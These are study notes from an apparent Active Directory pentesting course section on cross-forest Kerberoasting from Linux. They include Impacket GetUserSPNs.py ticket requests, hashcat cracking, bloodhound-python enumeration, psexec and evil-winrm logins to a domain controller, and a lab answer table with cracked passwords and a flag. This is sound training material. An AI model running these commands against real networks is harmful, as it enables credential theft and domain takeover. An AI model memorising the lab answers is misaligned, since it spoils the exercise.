# Section 31 — Attacking Domain Trusts: Cross-Forest Trust Abuse (Linux)

## ID
531

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 31 — Cross-Forest Trust Abuse - from Linux

## Description
Performs cross-forest Kerberoasting from a Linux attack host using GetUserSPNs.py and enumerates foreign group membership with bloodhound-python across forest trusts.

## Tags
kerberoasting, cross-forest, impacket, bloodhound-python, linux, getuserspns

## Commands
- `GetUserSPNs.py -target-domain <TARGET_DOMAIN> <CURRENT_DOMAIN>/<USER>`
- `GetUserSPNs.py -request -target-domain <TARGET_DOMAIN> <CURRENT_DOMAIN>/<USER> -outputfile <FILE>`
- `hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt`
- `bloodhound-python -d <DOMAIN> -dc <DC_FQDN> -c All -u <USER> -p <PASS>`
- `bloodhound-python -d <TARGET_DOMAIN> -dc <TARGET_DC_FQDN> -c All -u <USER>@<CURRENT_DOMAIN> -p <PASS>`
- `psexec.py <TARGET_DOMAIN>/<USER>:'<PASS>'@<TARGET_DC_FQDN>`
- `evil-winrm -i <TARGET_DC> -u <USER> -p '<PASS>'`

## What This Section Covers
The Linux equivalent of cross-forest Kerberoasting uses Impacket's `GetUserSPNs.py` with the `-target-domain` flag. For foreign group membership enumeration, `bloodhound-python` is run against both domains (updating `/etc/resolv.conf` each time) and the combined data is loaded into BloodHound GUI to visualize cross-forest relationships. After cracking a Domain Admin's TGS, access is validated via psexec or evil-winrm.

## Concept — What Is an AD Forest?

An AD Forest is the top-level security and administrative boundary in Active Directory. It is the ultimate trust container — everything inside one forest shares certain things automatically, and everything across forests is isolated by default.

### What is shared WITHIN a single forest
- **Schema** — defines what objects and attributes can exist (uniform across all domains in the forest)
- **Configuration partition** — sites, replication topology, service connection points
- **Global Catalog** — searchable index of all objects across every domain in the forest
- **Transitive trusts** — all domains automatically trust each other (A trusts B, B trusts C → A trusts C)
- **Enterprise Admins** — a single group with admin rights over every domain in the forest

### What DIFFERS across forests
- **Schema** — each forest has its own independent schema
- **Security policies** — separate password policies, GPOs, audit configs
- **DNS namespace** — completely separate domain names (e.g., `INLANEFREIGHT.LOCAL` vs `FREIGHTLOGISTICS.LOCAL`)
- **No automatic trust** — cross-forest trusts must be manually created (forest trust or external trust)
- **SID Filtering** — enabled by default on cross-forest trusts, strips foreign SIDs from tokens during authentication

### Why this matters for pentesting
- **Within a forest**: owning one domain usually means you can own the entire forest (ExtraSids attack, Golden Ticket, parent-child trust abuse). The shared schema and transitive trusts make lateral movement straightforward.
- **Across forests**: there's no automatic path. You must exploit the trust relationship itself through one of four main vectors: cross-forest Kerberoasting, admin password reuse, foreign group membership (Domain Local Groups), or SID History abuse (only if SID Filtering is disabled).
- The forest boundary is the **true security boundary** in AD — not the domain.

## Methodology
1. **SSH to the Linux attack host** and verify DNS resolution to both domains.
2. **Enumerate SPNs across the trust** with `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` — lists all Kerberoastable accounts in the foreign forest.
3. **Request TGS tickets** by adding `-request -outputfile cross_forest_tgs.txt` to the same command.
4. **Crack offline** with `hashcat -m 13100 cross_forest_tgs.txt /usr/share/wordlists/rockyou.txt`.
5. **Collect BloodHound data from both domains** — edit `/etc/resolv.conf` to point at each domain's DC, then run `bloodhound-python` against each domain separately.
6. **Upload both JSON sets** to BloodHound GUI → Analysis tab → "Users with Foreign Domain Group Membership" to visualize cross-forest admin access.
7. **Validate access** using cracked Domain Admin creds via `psexec.py` or `evil-winrm` against the target DC.
8. **Check for password reuse** — try the cracked password against similarly named accounts in the current domain and consider a targeted single-password spray.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Other SPN account besides MSSQLsvc | `sapsso` | `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` — HTTP/sapsso.FREIGHTLOGISTICS.LOCAL SPN, also Domain Admin |
| Q2: Cracked TGS password | `pabloPICASSO` | hashcat -m 13100 against rockyou.txt (sapsso account) |
| Q3: Flag from DC03 desktop | `burn1ng_d0wn_th3_f0rest!` | `psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:'pabloPICASSO'@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL` → `type C:\Users\Administrator\Desktop\flag.txt` |

## Key Takeaways
- The Linux cross-forest Kerberoast workflow is identical to normal Kerberoasting — just add `-target-domain <FOREIGN_DOMAIN>` to `GetUserSPNs.py`.
- `bloodhound-python` requires DNS to resolve the target DC's FQDN — always update `/etc/resolv.conf` before running it against a new domain.
- When authenticating to a foreign domain's DC with `bloodhound-python`, use the `user@currentdomain` format (e.g., `forend@inlanefreight.local`).
- After cracking a cross-forest Kerberoast, always try a **single password spray** — the same admins may have set the same password on multiple service accounts.
- Iterative testing matters: even if you've fully compromised Domain A, cracking a hash from Domain B and finding password reuse back in Domain A is still a reportable finding.

## Gotchas
- `/etc/resolv.conf` changes are overwritten on reboot — make sure DNS is pointing to the right DC before each `bloodhound-python` run.
- `GetUserSPNs.py` prompts for the password interactively — you can also pass it inline as `DOMAIN/user:password` to avoid the prompt.
- If `evil-winrm` isn't installed on the attack host, fall back to `psexec.py` or `wmiexec.py` from Impacket.
- When multiple SPN accounts are returned, each hash cracks to a **different password** — match each cracked password to the correct account before attempting authentication (e.g., `mssqlsvc` = `1logistics`, `sapsso` = `pabloPICASSO`).


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[29-domain-trusts-child-to-parent-linux]] | [[32-hardening-active-directory]] →
<!-- AUTO-LINKS-END -->
